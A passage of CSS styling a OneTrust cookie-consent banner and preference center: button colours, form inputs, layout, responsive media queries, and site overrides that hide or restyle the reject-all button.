        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus {
            color: #fff;
            background-color: #1eaedb;
            border-color: #1eaedb
        }

        #onetrust-banner-sdk input[type="email"],
        #onetrust-banner-sdk input[type="number"],
        #onetrust-banner-sdk input[type="search"],
        #onetrust-banner-sdk input[type="text"],
        #onetrust-banner-sdk input[type="tel"],
        #onetrust-banner-sdk input[type="url"],
        #onetrust-banner-sdk input[type="password"],
        #onetrust-banner-sdk textarea,
        #onetrust-banner-sdk select,
        #onetrust-pc-sdk input[type="email"],
        #onetrust-pc-sdk input[type="number"],
        #onetrust-pc-sdk input[type="search"],
        #onetrust-pc-sdk input[type="text"],
        #onetrust-pc-sdk input[type="tel"],
        #onetrust-pc-sdk input[type="url"],
        #onetrust-pc-sdk input[type="password"],
        #onetrust-pc-sdk textarea,
        #onetrust-pc-sdk select,
        #ot-sdk-cookie-policy input[type="email"],
        #ot-sdk-cookie-policy input[type="number"],
        #ot-sdk-cookie-policy input[type="search"],
        #ot-sdk-cookie-policy input[type="text"],
        #ot-sdk-cookie-policy input[type="tel"],
        #ot-sdk-cookie-policy input[type="url"],
        #ot-sdk-cookie-policy input[type="password"],
        #ot-sdk-cookie-policy textarea,
        #ot-sdk-cookie-policy select {
            height: 38px;
            padding: 6px 10px;
            background-color: #fff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            box-shadow: none;
            box-sizing: border-box
        }

        #onetrust-banner-sdk input[type="email"],
        #onetrust-banner-sdk input[type="number"],
        #onetrust-banner-sdk input[type="search"],
        #onetrust-banner-sdk input[type="text"],
        #onetrust-banner-sdk input[type="tel"],
        #onetrust-banner-sdk input[type="url"],
        #onetrust-banner-sdk input[type="password"],
        #onetrust-banner-sdk textarea,
        #onetrust-pc-sdk input[type="email"],
        #onetrust-pc-sdk input[type="number"],
        #onetrust-pc-sdk input[type="search"],
        #onetrust-pc-sdk input[type="text"],
        #onetrust-pc-sdk input[type="tel"],
        #onetrust-pc-sdk input[type="url"],
        #onetrust-pc-sdk input[type="password"],
        #onetrust-pc-sdk textarea,
        #ot-sdk-cookie-policy input[type="email"],
        #ot-sdk-cookie-policy input[type="number"],
        #ot-sdk-cookie-policy input[type="search"],
        #ot-sdk-cookie-policy input[type="text"],
        #ot-sdk-cookie-policy input[type="tel"],
        #ot-sdk-cookie-policy input[type="url"],
        #ot-sdk-cookie-policy input[type="password"],
        #ot-sdk-cookie-policy textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        #onetrust-banner-sdk textarea,
        #onetrust-pc-sdk textarea,
        #ot-sdk-cookie-policy textarea {
            min-height: 65px;
            padding-top: 6px;
            padding-bottom: 6px
        }

        #onetrust-banner-sdk input[type="email"]:focus,
        #onetrust-banner-sdk input[type="number"]:focus,
        #onetrust-banner-sdk input[type="search"]:focus,
        #onetrust-banner-sdk input[type="text"]:focus,
        #onetrust-banner-sdk input[type="tel"]:focus,
        #onetrust-banner-sdk input[type="url"]:focus,
        #onetrust-banner-sdk input[type="password"]:focus,
        #onetrust-banner-sdk textarea:focus,
        #onetrust-banner-sdk select:focus,
        #onetrust-pc-sdk input[type="email"]:focus,
        #onetrust-pc-sdk input[type="number"]:focus,
        #onetrust-pc-sdk input[type="search"]:focus,
        #onetrust-pc-sdk input[type="text"]:focus,
        #onetrust-pc-sdk input[type="tel"]:focus,
        #onetrust-pc-sdk input[type="url"]:focus,
        #onetrust-pc-sdk input[type="password"]:focus,
        #onetrust-pc-sdk textarea:focus,
        #onetrust-pc-sdk select:focus,
        #ot-sdk-cookie-policy input[type="email"]:focus,
        #ot-sdk-cookie-policy input[type="number"]:focus,
        #ot-sdk-cookie-policy input[type="search"]:focus,
        #ot-sdk-cookie-policy input[type="text"]:focus,
        #ot-sdk-cookie-policy input[type="tel"]:focus,
        #ot-sdk-cookie-policy input[type="url"]:focus,
        #ot-sdk-cookie-policy input[type="password"]:focus,
        #ot-sdk-cookie-policy textarea:focus,
        #ot-sdk-cookie-policy select:focus {
            border: 1px solid #000;
            outline: 0
        }

        #onetrust-banner-sdk label,
        #onetrust-banner-sdk legend,
        #onetrust-pc-sdk label,
        #onetrust-pc-sdk legend,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy legend {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600
        }

        #onetrust-banner-sdk fieldset,
        #onetrust-pc-sdk fieldset,
        #ot-sdk-cookie-policy fieldset {
            padding: 0;
            border-width: 0
        }

        #onetrust-banner-sdk input[type="checkbox"],
        #onetrust-banner-sdk input[type="radio"],
        #onetrust-pc-sdk input[type="checkbox"],
        #onetrust-pc-sdk input[type="radio"],
        #ot-sdk-cookie-policy input[type="checkbox"],
        #ot-sdk-cookie-policy input[type="radio"] {
            display: inline
        }

        #onetrust-banner-sdk label>.label-body,
        #onetrust-pc-sdk label>.label-body,
        #ot-sdk-cookie-policy label>.label-body {
            display: inline-block;
            margin-left: 0.5rem;
            font-weight: normal
        }

        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            list-style: circle inside
        }

        #onetrust-banner-sdk ol,
        #onetrust-pc-sdk ol,
        #ot-sdk-cookie-policy ol {
            list-style: decimal inside
        }

        #onetrust-banner-sdk ol,
        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ol,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ol,
        #ot-sdk-cookie-policy ul {
            padding-left: 0;
            margin-top: 0
        }

        #onetrust-banner-sdk ul ul,
        #onetrust-banner-sdk ul ol,
        #onetrust-banner-sdk ol ol,
        #onetrust-banner-sdk ol ul,
        #onetrust-pc-sdk ul ul,
        #onetrust-pc-sdk ul ol,
        #onetrust-pc-sdk ol ol,
        #onetrust-pc-sdk ol ul,
        #ot-sdk-cookie-policy ul ul,
        #ot-sdk-cookie-policy ul ol,
        #ot-sdk-cookie-policy ol ol,
        #ot-sdk-cookie-policy ol ul {
            margin: 1.5rem 0 1.5rem 3rem;
            font-size: 90%
        }

        #onetrust-banner-sdk li,
        #onetrust-pc-sdk li,
        #ot-sdk-cookie-policy li {
            margin-bottom: 1rem
        }

        #onetrust-banner-sdk code,
        #onetrust-pc-sdk code,
        #ot-sdk-cookie-policy code {
            padding: 0.2rem 0.5rem;
            margin: 0 0.2rem;
            font-size: 90%;
            white-space: nowrap;
            background: #f1f1f1;
            border: 1px solid #e1e1e1;
            border-radius: 4px
        }

        #onetrust-banner-sdk pre>code,
        #onetrust-pc-sdk pre>code,
        #ot-sdk-cookie-policy pre>code {
            display: block;
            padding: 1rem 1.5rem;
            white-space: pre
        }

        #onetrust-banner-sdk th,
        #onetrust-banner-sdk td,
        #onetrust-pc-sdk th,
        #onetrust-pc-sdk td,
        #ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e1e1
        }

        #onetrust-banner-sdk .ot-sdk-u-full-width,
        #onetrust-pc-sdk .ot-sdk-u-full-width,
        #ot-sdk-cookie-policy .ot-sdk-u-full-width {
            width: 100%;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-u-max-full-width,
        #onetrust-pc-sdk .ot-sdk-u-max-full-width,
        #ot-sdk-cookie-policy .ot-sdk-u-max-full-width {
            max-width: 100%;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-u-pull-right,
        #onetrust-pc-sdk .ot-sdk-u-pull-right,
        #ot-sdk-cookie-policy .ot-sdk-u-pull-right {
            float: right
        }

        #onetrust-banner-sdk .ot-sdk-u-pull-left,
        #onetrust-pc-sdk .ot-sdk-u-pull-left,
        #ot-sdk-cookie-policy .ot-sdk-u-pull-left {
            float: left
        }

        #onetrust-banner-sdk hr,
        #onetrust-pc-sdk hr,
        #ot-sdk-cookie-policy hr {
            margin-top: 3rem;
            margin-bottom: 3.5rem;
            border-width: 0;
            border-top: 1px solid #e1e1e1
        }

        #onetrust-banner-sdk .ot-sdk-container:after,
        #onetrust-banner-sdk .ot-sdk-row:after,
        #onetrust-banner-sdk .ot-sdk-u-cf,
        #onetrust-pc-sdk .ot-sdk-container:after,
        #onetrust-pc-sdk .ot-sdk-row:after,
        #onetrust-pc-sdk .ot-sdk-u-cf,
        #ot-sdk-cookie-policy .ot-sdk-container:after,
        #ot-sdk-cookie-policy .ot-sdk-row:after,
        #ot-sdk-cookie-policy .ot-sdk-u-cf {
            content: "";
            display: table;
            clear: both
        }

        #onetrust-banner-sdk .ot-sdk-row,
        #onetrust-pc-sdk .ot-sdk-row,
        #ot-sdk-cookie-policy .ot-sdk-row {
            margin: 0;
            max-width: none;
            display: block
        }

        #onetrust-banner-sdk {
            box-shadow: 0 0 18px rgba(0, 0, 0, .2)
        }

        #onetrust-banner-sdk.otCenterRounded {
            z-index: 2147483645;
            top: 10%;
            position: fixed;
            right: 0;
            background-color: #fff;
            width: 60%;
            max-width: 650px;
            border-radius: 2.5px;
            left: 1em;
            margin: 0 auto;
            font-size: 14px;
            max-height: 90%;
            overflow-x: hidden;
            overflow-y: auto
        }

        #onetrust-banner-sdk.otRelFont {
            font-size: .875rem
        }

        #onetrust-banner-sdk::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-banner-sdk::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #c1c1c1
        }

        #onetrust-banner-sdk {
            scrollbar-arrow-color: #c1c1c1;
            scrollbar-darkshadow-color: #c1c1c1;
            scrollbar-face-color: #c1c1c1;
            scrollbar-shadow-color: #c1c1c1
        }

        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk p {
            color: dimgray
        }

        #onetrust-banner-sdk #onetrust-policy {
            margin-top: 20px
        }

        #onetrust-banner-sdk #onetrust-policy-title {
            float: left;
            text-align: left;
            font-size: 1em;
            line-height: 1.4;
            margin-bottom: 0;
            padding: 0 0 10px 30px;
            width: calc(100% - 90px)
        }

        #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-banner-sdk .ot-b-addl-desc,
        #onetrust-banner-sdk .ot-gv-list-handler {
            clear: both;
            float: left;
            margin: 0 30px 10px 30px;
            font-size: .813em;
            line-height: 1.5
        }

        #onetrust-banner-sdk #onetrust-policy-text *,
        #onetrust-banner-sdk .ot-b-addl-desc *,
        #onetrust-banner-sdk .ot-gv-list-handler * {
            line-height: inherit;
            font-size: inherit;
            margin: 0
        }

        #onetrust-banner-sdk .ot-gv-list-handler {
            padding: 0;
            border: 0;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk .ot-b-addl-desc {
            display: block
        }

        #onetrust-banner-sdk #onetrust-button-group-parent {
            padding: 15px 30px;
            text-align: center
        }

        #onetrust-banner-sdk #onetrust-button-group-parent:not(.has-reject-all-button) #onetrust-button-group {
            text-align: right
        }

        #onetrust-banner-sdk #onetrust-button-group {
            text-align: center;
            display: inline-block;
            width: 100%
        }

        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            margin-right: 1em
        }

        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            border: 1px solid #6cc04a;
            max-width: 45%
        }

        #onetrust-banner-sdk .banner-actions-container {
            float: right;
            width: 50%
        }

        #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: #fff;
            border: none;
            color: #6cc04a;
            text-decoration: underline;
            padding-left: 0;
            padding-right: 0
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            background-color: #6cc04a;
            color: #fff;
            border-color: #6cc04a;
            min-width: 135px;
            padding: 12px 10px;
            letter-spacing: .05em;
            line-height: 1.4;
            font-size: .813em;
            font-weight: 600;
            height: auto;
            white-space: normal;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
            float: left;
            max-width: calc(40% - 18px)
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
            text-align: left;
            margin-right: 0
        }

        #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
            max-width: 60%;
            width: auto
        }

        #onetrust-banner-sdk .ot-close-icon {
            width: 44px;
            height: 44px;
            background-size: 12px;
            margin: -18px -18px 0 0;
            border: none;
            display: inline-block;
            padding: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container {
            position: absolute;
            right: 24px;
            top: 24px
        }

        #onetrust-banner-sdk .banner_logo {
            display: none
        }

        #onetrust-banner-sdk #banner-options {
            float: left;
            padding: 0 30px;
            width: calc(100% - 90px)
        }

        #onetrust-banner-sdk .banner-option {
            margin-bottom: 10px
        }

        #onetrust-banner-sdk .banner-option-input {
            cursor: pointer;
            width: auto;
            height: auto;
            border: none;
            padding: 0;
            padding-right: 3px;
            margin: 0 0 6px;
            font-size: .82em;
            line-height: 1.4
        }

        #onetrust-banner-sdk .banner-option-input * {
            pointer-events: none;
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
            transform: rotate(90deg)
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
            height: auto;
            display: block
        }

        #onetrust-banner-sdk .banner-option-header {
            cursor: pointer;
            display: inline-block
        }

        #onetrust-banner-sdk .banner-option-header :first-child {
            color: dimgray;
            font-weight: bold;
            float: left
        }

        #onetrust-banner-sdk .ot-arrow-container,
        #onetrust-banner-sdk .banner-option-details {
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-banner-sdk .ot-arrow-container {
            display: inline-block;
            border-top: 6px solid transparent;
            border-bottom: 6px solid transparent;
            border-left: 6px solid dimgray;
            margin-left: 10px;
            vertical-align: middle
        }

        #onetrust-banner-sdk .banner-option-details {
            display: none;
            font-size: .83em;
            line-height: 1.5;
            height: 0px;
            padding: 10px 10px 5px 10px
        }

        #onetrust-banner-sdk .banner-option-details * {
            font-size: inherit;
            line-height: inherit;
            color: dimgray
        }

        #onetrust-banner-sdk .ot-dpd-container {
            float: left;
            margin: 0 30px 10px 30px
        }

        #onetrust-banner-sdk .ot-dpd-title {
            font-weight: bold;
            padding-bottom: 10px
        }

        #onetrust-banner-sdk .ot-dpd-title {
            font-size: 1em;
            line-height: 1.4
        }

        #onetrust-banner-sdk .ot-dpd-desc {
            font-size: .813em;
            line-height: 1.5;
            margin-bottom: 0
        }

        #onetrust-banner-sdk .ot-dpd-desc * {
            margin: 0
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            display: block;
            margin-left: 0px;
            margin-top: 5px;
            padding: 0;
            margin-bottom: 0;
            border: 0;
            line-height: normal;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk :not(.ot-dpd-desc)>.ot-b-addl-desc {
            float: left;
            margin: 0 30px 10px 30px
        }

        #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
            margin-top: 10px;
            margin-bottom: 10px;
            font-size: 1em;
            line-height: 1.5;
            float: none
        }

        #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: bold;
            margin-left: 5px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
            top: 15px;
            transform: none;
            right: 15px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
            padding: 0;
            white-space: pre-wrap;
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .75em
        }

        #onetrust-banner-sdk.ot-close-btn-link.ot-wo-title #onetrust-group-container {
            margin-top: 20px
        }

        @media only screen and (max-width: 425px) {

            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%;
                margin-bottom: 10px
            }

            #onetrust-banner-sdk #onetrust-pc-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler {
                margin-right: 0
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                text-align: center
            }

            #onetrust-banner-sdk .banner-actions-container,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%;
                max-width: none
            }

            #onetrust-banner-sdk.otCenterRounded {
                left: 0;
                width: 95%;
                top: 50%;
                transform: translateY(-50%);
                -webkit-transform: translateY(-50%)
            }
        }

        @media only screen and (max-width: 600px) {
            #onetrust-banner-sdk .ot-sdk-container {
                width: auto;
                padding: 0
            }

            #onetrust-banner-sdk #onetrust-policy-title {
                padding: 0 22px 10px 22px
            }

            #onetrust-banner-sdk #onetrust-policy-text,
            #onetrust-banner-sdk :not(.ot-dpd-desc)>.ot-b-addl-desc,
            #onetrust-banner-sdk .ot-dpd-container {
                margin: 0 22px 10px 22px;
                width: calc(100% - 44px)
            }

            #onetrust-banner-sdk #onetrust-button-group-parent {
                padding: 15px 22px
            }

            #onetrust-banner-sdk #banner-options {
                padding: 0 22px;
                width: calc(100% - 44px)
            }

            #onetrust-banner-sdk .banner-option {
                margin-bottom: 6px
            }

            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                float: none;
                max-width: 100%
            }

            #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
                width: 100%;
                text-align: center;
                max-width: 100%
            }

            #onetrust-banner-sdk.ot-close-btn-link #onetrust-group-container {
                margin-top: 20px
            }
        }

        @media only screen and (min-width: 426px)and (max-width: 896px) {
            #onetrust-banner-sdk.otCenterRounded {
                left: 0;
                top: 15%;
                transform: translateY(-13%);
                -webkit-transform: translateY(-13%);
                max-width: 600px;
                width: 95%
            }
        }

        #onetrust-consent-sdk #onetrust-banner-sdk {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-policy-title,
        #onetrust-consent-sdk #onetrust-policy-text,
        #onetrust-consent-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk .ot-dpd-desc,
        #onetrust-consent-sdk .ot-dpd-title,
        #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
        #onetrust-banner-sdk .ot-cat-header {
            color: #696969;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
            background-color: #E9E9E9;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href],
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
            color: #b0b0b0;
        }

        #onetrust-consent-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler {
            background-color: #FF5F00;
            border-color: #FF5F00;
            color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-btn-handler,
        #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            color: #b0b0b0;
            border-color: #b0b0b0;
            background-color:
                #FFFFFF;
        }

        /*hide reject all button at bottom*/
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-sdk-container .ot-sdk-row #onetrust-button-group-parent #onetrust-button-group .banner-actions-container #onetrust-reject-all-handler {
            display: none;
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
            float: right;
            border-radius: 30px;
        }

        #onetrust-consent-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler {
            border-radius: 30px;
        }

        /*get borders back on CTAs*/
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-sdk-container .ot-sdkrow #onetrust-button-group-parent #onetrust-button-group .banneractions-container #onetrust-accept-btn-handler {
            border: 1px solid;
        }

        /*move continue without accepting button to right*/
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler {
            float: right;
            top: 0px;
            margin: 0px;
            background: transparent;
            color: #696969;
            border: 0;
            font-weight: 500;
        }

        #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: 400;
        }

        #onetrust-banner-sdk #onetrust-policy {
            margin-top: 5px;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk .ot-sdk-container .ot-sdkrow #onetrust-group-container #onetrust-policy {
            margin-top: 0px;
        }

        @media only screen and (max-width: 600px) {
            #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-allhandler {
                text-align: right;
                max-width: fit-content;
            }
        }

        #onetrust-pc-sdk.otPcCenter {
            overflow: hidden;
            position: fixed;
            margin: 0 auto;
            top: 5%;
            right: 0;
            left: 0;
            width: 40%;
            max-width: 575px;
            min-width: 575px;
            border-radius: 2.5px;
            z-index: 2147483647;
            background-color: #fff;
            -webkit-box-shadow: 0px 2px 10px -3px #999;
            -moz-box-shadow: 0px 2px 10px -3px #999;
            box-shadow: 0px 2px 10px -3px #999
        }

        #onetrust-pc-sdk.otPcCenter[dir=rtl] {
            right: 0;
            left: 0
        }

        #onetrust-pc-sdk.otRelFont {
            font-size: 1rem
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus,
        #onetrust-pc-sdk .ot-hide-tgl {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus *,
        #onetrust-pc-sdk .ot-hide-tgl * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-gn-venlst .ot-ven-item .ot-acc-hdr {
            min-height: 40px
        }

        #onetrust-pc-sdk .ot-pc-header {
            height: 39px;
            padding: 10px 0 10px 30px;
            border-bottom: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk #ot-lst-title,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ven-name,
        #onetrust-pc-sdk .ot-always-active {
            font-weight: bold;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-cat-header {
            float: left;
            font-weight: 600;
            font-size: .875em;
            line-height: 1.5;
            max-width: 90%;
            vertical-align: middle
        }

        #onetrust-pc-sdk .ot-always-active-group .ot-cat-header {
            width: 55%;
            font-weight: 700
        }

        #onetrust-pc-sdk .ot-cat-item p {
            clear: both;
            float: left;
            margin-top: 10px;
            margin-bottom: 5px;
            line-height: 1.5;
            font-size: .812em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-close-icon {
            height: 44px;
            width: 44px;
            background-size: 10px
        }

        #onetrust-pc-sdk #ot-pc-title {
            float: left;
            font-size: 1em;
            line-height: 1.5;
            margin-bottom: 10px;
            margin-top: 10px;
            width: 100%
        }

        #onetrust-pc-sdk #accept-recommended-btn-handler {
            margin-right: 10px;
            margin-bottom: 25px;
            outline-offset: -1px
        }

        #onetrust-pc-sdk #ot-pc-desc {
            clear: both;
            width: 100%;
            font-size: .812em;
            line-height: 1.5;
            margin-bottom: 25px
        }

        #onetrust-pc-sdk #ot-pc-desc a {
            margin-left: 5px
        }

        #onetrust-pc-sdk #ot-pc-desc * {
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-pc-sdk #ot-pc-desc ul li {
            padding: 10px 0px
        }

        #onetrust-pc-sdk a {
            color: #656565;
            cursor: pointer
        }

        #onetrust-pc-sdk a:hover {
            color: #3860be
        }

        #onetrust-pc-sdk label {
            margin-bottom: 0
        }

        #onetrust-pc-sdk #vdr-lst-dsc {
            font-size: .812em;
            line-height: 1.5;
            padding: 10px 15px 5px 15px
        }

        #onetrust-pc-sdk button {
            max-width: 394px;
            padding: 12px 30px;
            line-height: 1;
            word-break: break-word;
            word-wrap: break-word;
            white-space: normal;
            font-weight: bold;
            height: auto
        }

        #onetrust-pc-sdk .ot-link-btn {
            padding: 0;
            margin-bottom: 0;
            border: 0;
            font-weight: normal;
            line-height: normal;
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-pc-content {
            position: absolute;
            overflow-y: scroll;
            padding-left: 0px;
            padding-right: 30px;
            top: 60px;
            bottom: 110px;
            margin: 1px 3px 0 30px;
            width: calc(100% - 63px)
        }

        #onetrust-pc-sdk .ot-cat-grp .ot-always-active {
            float: right;
            clear: none;
            color: #3860be;
            margin: 0;
            font-size: .813em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-track {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #d8d8d8
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-pc-scrollbar {
            scrollbar-arrow-color: #d8d8d8;
            scrollbar-darkshadow-color: #d8d8d8;
            scrollbar-face-color: #d8d8d8;
            scrollbar-shadow-color: #d8d8d8
        }

        #onetrust-pc-sdk .save-preference-btn-handler {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
            margin-right: 10px
        }

        #onetrust-pc-sdk #ot-pc-desc .privacy-notice-link {
            margin-left: 0
        }

        #onetrust-pc-sdk .ot-subgrp-cntr {
            display: inline-block;
            clear: both;
            width: 100%;
            padding-top: 15px
        }

        #onetrust-pc-sdk .ot-switch+.ot-subgrp-cntr {
            padding-top: 10px
        }

        #onetrust-pc-sdk ul.ot-subgrps {
            margin: 0;
            font-size: initial
        }

        #onetrust-pc-sdk ul.ot-subgrps li p,
        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            font-size: .813em;
            line-height: 1.4;
            color: dimgray
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch {
            min-height: auto
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch-nob {
            top: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr {
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-txt {
            margin: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps li {
            padding: 0;
            border: none
        }

        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            position: relative;
            top: 5px;
            font-weight: bold;
            margin-bottom: 0;
            float: left
        }

        #onetrust-pc-sdk li.ot-subgrp {
            margin-left: 20px;
            overflow: auto
        }

        #onetrust-pc-sdk li.ot-subgrp>h5 {
            width: calc(100% - 100px)
        }

        #onetrust-pc-sdk .ot-cat-item p>ul,
        #onetrust-pc-sdk li.ot-subgrp p>ul {
            margin: 0px;
            list-style: disc;
            margin-left: 15px;
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li,
        #onetrust-pc-sdk li.ot-subgrp p>ul li {
            font-size: inherit;
            padding-top: 10px;
            padding-left: 0px;
            padding-right: 0px;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li:last-child,
        #onetrust-pc-sdk li.ot-subgrp p>ul li:last-child {
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-pc-logo {
            height: 40px;
            width: 120px;
            display: inline-block
        }

        #onetrust-pc-sdk .ot-pc-footer {
            position: absolute;
            bottom: 0px;
            width: 100%;
            max-height: 160px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler {
            margin-bottom: 0px
        }

        #onetrust-pc-sdk.ot-ftr-stacked #ot-pc-content {
            bottom: 160px
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button {
            width: 100%;
            max-width: none
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
            margin: 0 30px;
            width: calc(100% - 60px);
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-pc-footer-logo {
            height: 30px;
            width: 100%;
            text-align: right;
            background: #f4f4f4
        }

        #onetrust-pc-sdk .ot-pc-footer-logo a {
            display: inline-block;
            margin-top: 5px;
            margin-right: 10px
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo {
            direction: rtl
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo a {
            margin-right: 25px
        }

        #onetrust-pc-sdk .ot-tgl {
            float: right;
